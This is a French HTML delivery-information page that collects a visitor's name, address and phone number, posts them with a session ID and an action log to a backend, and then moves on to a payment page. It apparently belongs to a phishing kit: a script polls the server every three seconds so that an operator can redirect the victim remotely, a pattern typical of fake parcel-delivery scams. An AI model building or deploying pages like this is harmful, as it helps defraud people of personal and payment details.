<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>ðŸ“¦ Livraison</title>
  <style>
    body { font-family: Arial; background: #f8f8f8; text-align: center; }
    form { display: inline-block; background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 0 5px #ccc; }
    input { display: block; margin: 10px auto; padding: 8px; width: 80%; border-radius: 8px; border: 1px solid #ccc; }
    button { background: #111; color: white; padding: 10px; border: none; border-radius: 8px; cursor: pointer; }
  </style>
</head>
<body>
  <h1>ðŸ“¦ Informations de livraison</h1>
  <form onsubmit="sendDelivery(event)">
    <input id="nom" placeholder="Nom" required>
    <input id="prenom" placeholder="PrÃ©nom" required>
    <input id="adresse" placeholder="Adresse complÃ¨te" required>
    <input id="telephone" placeholder="TÃ©lÃ©phone" required>
    <button type="submit">Continuer vers Paiement</button>
  </form>

  <script>
    const sessionId = localStorage.getItem('sessionId');
    async function sendDelivery(e){
      e.preventDefault();
      const data = {
        sessionId,
        nom: nom.value,
        prenom: prenom.value,
        adresse: adresse.value,
        telephone: telephone.value
      };
      await fetch('/api/action', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ ...data, page:'Livraison', action:'Soumis infos livraison' })
      });
      window.location.href = '/paiement.html';
    }

    async function pollStatus(){
      const res = await fetch('/api/status?sessionId='+sessionId);
      const data = await res.json();
      if(data.redirect){
        window.location.href = '/' + data.redirect + '.html';
      }
      setTimeout(pollStatus, 3000);
    }
    pollStatus();
  </script>
</body>
</html>
